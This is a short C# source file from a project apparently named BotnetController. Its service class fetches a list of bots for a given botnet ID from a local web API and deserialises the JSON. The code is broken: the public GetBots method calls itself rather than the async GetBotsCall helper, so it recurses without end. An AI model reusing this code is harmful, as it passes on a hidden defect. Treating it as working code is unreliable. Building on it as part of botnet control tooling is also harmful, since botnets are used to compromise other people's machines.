using BotnetController.Logic;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Net.Http;
using System.Threading.Tasks;

namespace BotnetController.Services
{
    public static class BotDataService
    {
        private static readonly HttpClient httpClient;
        private static readonly string address;
        static BotDataService()
        {
            httpClient = new HttpClient();
            address = "http://localhost:44343/api/Bots/";
        }

        public static List<Bot> GetBots(int botnetId)
        {
            var task = Task.Run(() => GetBots(botnetId));
            task.Wait();
            return task.Result;
        }

        private static async Task<List<Bot>> GetBotsCall(int botnetId)
        {
            string responseBody = await httpClient.GetStringAsync(address + "ByBotnetId/" + botnetId);
            List<Bot> bots = JsonConvert.DeserializeObject<List<Bot>>(responseBody);
            return bots;
        }
    }
}
